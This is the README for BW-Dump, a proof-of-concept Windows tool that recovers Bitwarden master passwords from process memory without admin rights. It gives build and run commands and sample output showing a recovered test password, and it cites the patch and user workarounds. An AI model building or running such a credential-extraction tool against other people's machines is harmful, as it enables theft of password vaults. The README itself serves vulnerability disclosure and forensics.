# BW-Dump

**Updated**: A patch was released on GitHub pull request ([5813](https://github.com/bitwarden/clients/pull/5813)) which fixes the vulnerability. The affected versions are Bitwarden Desktop `2023.7.0` and below.

## Description
A proof-of-concept tool that extracts the master password from a locked Bitwarden vault (must be unlocked at least once) from Windows systems, without requiring administrative privileges. Only Windows platforms have been tested.

A blog was published and is available at: https://redmaple.tech/blogs/2023/extract-bitwarden-vault-passwords/

### Demo
A short demo of using bw-dump with Microsoft Edge and the Bitwarden browser extension. The latest tool only works on the Bitwarden Desktop.

https://user-images.githubusercontent.com/9108334/191377244-f0e9a123-e4f0-43b0-90b5-697fc005ae7b.mov

## Building
> **Warning**: Windows Defender will report the compiled binary as malicious!

To build a stripped binary, type:
```
go build -ldflags="-s -w"
```

To build on a Linux system, type:
```bash
env GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
```

## Running
Simply build and execute the binary. It does NOT require admin rights. Make sure the Bitwarden process is running. In addition, the vault needs to be unlocked at least once. After which, the master password will be stored in memory for a period of time. 

You can also pass the `-d` option to dump memory regions when a pattern is found. For each result, a filename `dump-pid-<PID>-<MEM-REGION>.hex` is created in the current working directory.

**Example Output**
```bash
PS C:\Users\Tester\dev\go\bw-dump> bw-dump.exe

 888 88b, Y8b Y8b Y888P    888 88e
 888 88P'  Y8b Y8b Y8P     888 888b  8888 8888 888 888 8e  888 88e 
 888 8K     Y8b Y8b Y  888 888 8888D 8888 8888 888 888 88b 888 888b
 888 88b,    Y8b Y8b       888 888P  Y888 888P 888 888 888 888 888P
 888 88P'     Y8P Y        888 88"    "88 88"  888 888 888 888 88" 
                                                           888     
            Created by @NazMarkuta at Red Maple            888     
    
BW-Dump is a Windows forensics tool that extracts Bitwarden master passwords from locked vaults
(must be unlocked at least once) by reading process memory using Windows API functions which
searches for magic byte patterns. The tool doesn't require any special (admin) permissions.

Now supports Bitwarden Desktop App (v2023.1.1) running on Windows 10 or 11. The tool (may) 
still support older Bitwarden Chromium extension versions (v2022.6.0) and below.

[+] Searching for processes...
[+] PID: 4228
[+] EXEName: Bitwarden.exe
[+] CMDLine: "C:\Users\Tester\AppData\Local\Programs\Bitwarden\Bitwarden.exe" --type=renderer --user-data-dir="C:\Users\Tester\AppData\Roaming\Bitwarden" --app-path="C:\Users\Tester\AppData\Local\Programs\Bitwarden\resources\app.asar" --no-sandbox --no-zygote --first-renderer-process --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=4 --time-ticks-at-unix-epoch=-1675782335888921 --launch-time-ticks=4007177473 --mojo-platform-channel-handle=2508 --field-trial-handle=1792,i,3673052334935287551,6849534636950916074,131072 --disable-features=SpareRendererForSitePerProcess,WinRetrieveSuggestionsOnlyOnDemand /prefetch:1

[+] Searching PID memory (4228)
[+] Found pattern at MemBaseAddr (0xb0800554000)
[+] Found password prefix bytes at offset (0xc121)
[!] Invalid offset size, skipping...

[+] Found pattern at MemBaseAddr (0xb0800a8c000)
[+] Found password prefix bytes at offset (0x1104)
[!] Invalid offset size, skipping...

[+] Found pattern at MemBaseAddr (0xb08014bc000)
[+] Found password prefix bytes at offset (0x62aa)
[+] Password recovered: "SUPER-SECURE-password8"

PS C:\Users\Tester\dev\go\bw-dump> 
```

## Is there a solution or workaround?
There are two ways (probably more) the master password can be trashed from memory:
1. Once locked, enter any random WRONG password. This should replace your password stored in memory.
2. Terminate the `Bitwarden.exe` process which Windows should do some garbage collection.

## What's next?
- Create a Volaility3 plugin that can extract master passwords from saved memory dumps.
